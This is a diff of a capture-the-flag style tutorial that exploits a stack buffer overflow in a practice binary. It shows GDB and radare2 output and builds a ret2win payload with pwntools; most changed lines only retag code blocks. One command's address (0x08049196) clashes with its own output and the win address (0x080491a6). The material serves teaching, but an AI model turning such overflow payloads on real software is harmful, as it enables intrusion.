@@ -48,7 +48,7 @@ We see that all protections are disabled. The most important check for the buffe
 
 Let's go into GDB and find where this function takes input. Inside `read_in`:
 
-```as
+```nasm
   0x080491ec <+43>:	call   0x8049050 <gets@plt>
 ```
 
@@ -100,7 +100,7 @@ Let's do our analysis in GDB assuming that we don't have the source code (becaus
 First, we check the functions available:
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  info functions
 All defined functions:
 
@@ -127,7 +127,7 @@ Non-debugging symbols:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0xf7ef38a0]> afl
 0x08049090    1     44 entry0
 0x080490bd    1      4 fcn.080490bd
@@ -156,7 +156,7 @@ The three functions that we are interested in are `win`, `read_in`, and `main`. 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  disas win
 Dump of assembler code for function win:
    0x080491a6 <+0>:	push   ebp
@@ -179,7 +179,7 @@ Dump of assembler code for function win:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0xf7ef38a0]> pdf@sym.win
 ┌ 43: sym.win ();
 │           ; var int32_t var_4h @ ebp-0x4
@@ -215,7 +215,7 @@ Now, let's check `main`:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  disas main
 Dump of assembler code for function main:
    0x0804921e <+0>:	lea    ecx,[esp+0x4]
@@ -244,7 +244,7 @@ Dump of assembler code for function main:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0xf7ef38a0]> pdf@main
             ; DATA XREFS from entry0 @ 0x80490b0(r), 0x80490b6(w)
 ┌ 64: int main (char **argv);
@@ -280,7 +280,7 @@ We see that `main` just appears to call `read_in` and then return. So, let's go 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 Dump of assembler code for function read_in:
    0x080491d1 <+0>:	push   ebp
    0x080491d2 <+1>:	mov    ebp,esp
@@ -312,7 +312,7 @@ Dump of assembler code for function read_in:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0xf7ef38a0]> pdf@sym.read_in
             ; CALL XREF from main @ 0x8049238(x)
 ┌ 77: sym.read_in ();
@@ -354,7 +354,7 @@ To confirm this, we check what's being passed to `gets()`. Let's set a breakpoin
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  b *(read_in+63)
 gef➤  run
 gef➤  x/wx $esp
@@ -363,7 +363,7 @@ gef➤  x/wx $esp
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0xf7ef38a0]> db sym.read_in+63
 [0xf7ef38a0]> dc
 Can you figure out how to win here?
@@ -400,7 +400,7 @@ Remember earlier that I said that `gets()` does no bounds checking, meaning that
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/20wx $esp
 0xffffd600:	0xffffd618	0x00000020	0x00000000	0x080491dd
 0xffffd610:	0x00000000	0x00000000	0x01000000	0x0000000b
@@ -411,7 +411,7 @@ gef➤  x/20wx $esp
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x08049210]> pxw@esp
 0xff94f110  0xff94f128 0x00000020 0x00000000 0x080491dd  (... ...........
 0xff94f120  0x00000000 0x00000000 0x01000000 0x0000000b  ................
@@ -426,7 +426,7 @@ This looks like a lot of gibberish, but two numbers stand out in particular:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/wx 0xffffd60c
 0xffffd60c:	0x080491dd
 gef➤  x/wx 0xffffd64c
@@ -435,7 +435,7 @@ gef➤  x/wx 0xffffd64c
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x08049210]> pxw 4 @ 0xff94f11c
 0xff94f11c  0x080491dd                                   ....
 [0x08049210]> pxw 4 @ 0xff94f15c
@@ -448,13 +448,13 @@ _Why these two?_ The short answer is that the numbers were different! If we chec
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 0x8049000  0x804a000     0x1000     0x1000  r-xp   /home/joybuzzer/win32
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 0x08049000 - 0x0804a000 * usr     4K s r-x /home/joybuzzer/win32 /home/joybuzzer/win32 ; map._home_joybuzzer_win32.r_x
 ```
 {% endtab %}
@@ -464,7 +464,7 @@ This is _executable_ memory located inside the `win32` file. This is the **code 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/i 0x080491dd
    0x80491dd <read_in+12>:	add    ebx,0x2e23
 gef➤  x/i 0x0804923d
@@ -473,7 +473,7 @@ gef➤  x/i 0x0804923d
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x08049210]> pd1 @ 0x080491dd
 │           0x080491dd      81c3232e0000   add ebx, 0x2e23
 [0x08049210]> pd1 @ 0x0804923d
@@ -495,7 +495,7 @@ When a function is called, the following happens:
 3.  The **base pointer** is pushed onto the stack. This is the address of the previous base pointer. We see that here in the code:
    {% tabs %}
    {% tab title="GDB" %}
-    ```as
+    ```nasm
     gef➤  disas read_in
     Dump of assembler code for function read_in:
        0x080491d1 <+0>:	push   ebp
@@ -505,7 +505,7 @@ When a function is called, the following happens:
     ```
    {% endtab %}
    {% tab title="Radare2" %}
-   ```as
+   ```nasm
     [0x08049210]> pdf@sym.read_in
             ; CALL XREF from main @ 0x8049238(x)
     ┌ 77: sym.read_in ();
@@ -527,7 +527,7 @@ When the function returns, the following happens:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
    0x08049215 <+68>:	add    esp,0x10
    0x08049218 <+71>:	nop
    0x08049219 <+72>:	mov    ebx,DWORD PTR [ebp-0x4]
@@ -537,7 +537,7 @@ When the function returns, the following happens:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 │           0x08049215      83c410         add esp, 0x10
 │           0x08049218      90             nop
 │           0x08049219      8b5dfc         mov ebx, dword [var_4h]
@@ -566,14 +566,14 @@ We are still breakpointed at the call to `gets()`. Let's check the stack again:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/wx $esp
     0xffffd600:	0xffffd618
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x08049210]> pxw 4 @esp
 0xff94f110  0xff94f128                                   (...
 ```
@@ -584,14 +584,14 @@ This is the address we are going to write to. As a reminder, this is where we fo
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  x/wx $esp+0x4c
     0xffffd64c:	0x0804923d
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x08049210]> pxw 4 @ esp+0x4c
 0xff94f15c  0x0804923d                                   =...
 ``` 
@@ -600,7 +600,7 @@ gef➤  x/wx $esp+0x4c
 
 This means that in order to overwrite the return pointer, we need to write `0xffffd600` to `0xffffd64c`. How many bytes is this? Let's get some Python practice:
 
-```bash
+```nasm
 $ python3 -c "print(0xffffd64c-0xffffd600)"
 52
 ```
@@ -609,7 +609,7 @@ This means that we need to write `52` bytes, and **then** we need to overwrite t
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 gef➤  info functions win
 All functions matching regular expression "win":
 
@@ -619,7 +619,7 @@ Non-debugging symbols:
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 
 [0x08049210]> afl | grep win
 0x080491a6    1     43 sym.win
@@ -636,7 +636,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA134517158
 
 And what happens when we run this?
 
-```bash
+```nasm
 $ ./win32
 Can you figure out how to win here?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA134517158
@@ -647,13 +647,13 @@ We... crashed. What does that mean? That means we either corrupted memory or we 
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```nasm
 [#0] Id 1, Name: "win32", stopped 0x35343331 in ?? (), reason: SINGLE STEP
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-```as
+```nasm
 [0x35343331]> dso
 ERROR: debug-step-over: Decode error at 35343331
 ```
@@ -674,7 +674,7 @@ _How can we get the hexadecimal to appear correctly in the payload?_
 
 This is where pwntools comes in. Pwntools has a packaging function that allows for the packaging of data into the correct size and format. In 32-bit, this function is `p32()`. We modify the exploit to be:
 
-```bash
+```nasm
 $ python3 -c "from pwn import *; print(b'A' * 52 + p32(0x08049196))"
 
 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x91\x04\x08'
@@ -713,7 +713,7 @@ Let's break this exploit down:
 
 Let's run this exploit:
 
-```bash
+```nasm
 $ python3 win32.py
 [+] Starting local process './win32': pid 17532
 [*] Switching to interactive mode
